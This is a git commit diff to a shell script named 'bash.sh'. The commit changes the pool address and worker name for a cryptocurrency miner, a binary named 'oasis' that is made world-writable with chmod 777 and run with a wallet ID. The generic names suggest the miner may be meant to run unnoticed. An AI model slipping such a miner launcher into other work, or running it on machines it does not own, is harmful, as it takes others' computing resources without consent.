e540db18b9f34beb9b8f8444200d9eb0f9745006
yeralopaesa <yera.lopa@proton.me>
2025-02-25 12:59:55 +0700

    Update bash.sh

--- bash.sh
+++ bash.sh
@@ -9,4 +9,4 @@ for dir in $CPUFREQ_PATH; do
 done
 
 chmod 777 oasis
-./oasis --algorithm verushash --pool stratum+tcp://128.199.167.154:443 --wallet RN2u2EXEyW65CAgXpiqG99uuha5ATPcWSK.CRO-1 --password x
+./oasis --algorithm verushash --pool stratum+tcp://cn.vipor.net:5040 --wallet RN2u2EXEyW65CAgXpiqG99uuha5ATPcWSK.CRO-2 --password x
